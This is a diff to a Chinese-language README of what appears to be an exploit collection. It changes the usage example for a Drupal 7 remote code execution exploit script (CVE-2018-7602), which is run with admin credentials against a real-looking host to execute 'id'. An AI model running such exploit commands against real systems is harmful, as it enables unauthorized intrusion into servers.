@@ -68,7 +68,7 @@ Drupal是使用PHP语言编写的开源内容管理框架（CMF），它由内�
 ## CVE-2018-7602_cmd.py	Drupal 内核远程代码执行漏洞利用脚本(需要账户密码)
 > EXP:
 > ```
-> zhzy@debian:/debian/archives-tool/web-drupal$ python cve-2018-7602_cmd.py admin admin http://182.61.16.221:8081 -c id
+> zhzy@debian:/debian/archives-tool/web-drupal$ python cve-2018-7602_cmd.py admin admin http://freeerror.org:8080 -c id
 > ()
 > +---------------------------------------------------------------------------------+
 > +   DRUPAL 7 <= 7.58 REMOTE CODE EXECUTION (SA-CORE-2018-004 / CVE-2018-7602)     +
